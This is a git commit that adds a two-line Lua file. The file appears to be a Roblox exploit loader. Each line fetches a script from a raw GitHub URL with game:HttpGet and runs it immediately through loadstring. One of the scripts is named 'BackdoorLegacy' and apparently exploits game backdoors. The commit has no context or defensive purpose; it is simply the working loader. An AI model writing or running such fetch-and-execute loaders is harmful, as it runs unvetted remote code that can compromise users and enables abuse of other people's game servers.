164be442a683977b5ef94de4db46ee8ea5372f68
Bilsurrr <cemschro@gmail.com>
2025-07-15 09:51:51 +0200

    Add files via upload

---
+++ 1x1sxx1x1 legacy or sum.lua
@@ -0,0 +1,2 @@
+﻿loadstring(game:HttpGet('https://raw.githubusercontent.com/gojohdkaisenkt/Gojokaisenkt-hub/refs/heads/main/1x4%20by%20gojohdkaisenkt%20new'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua'))()
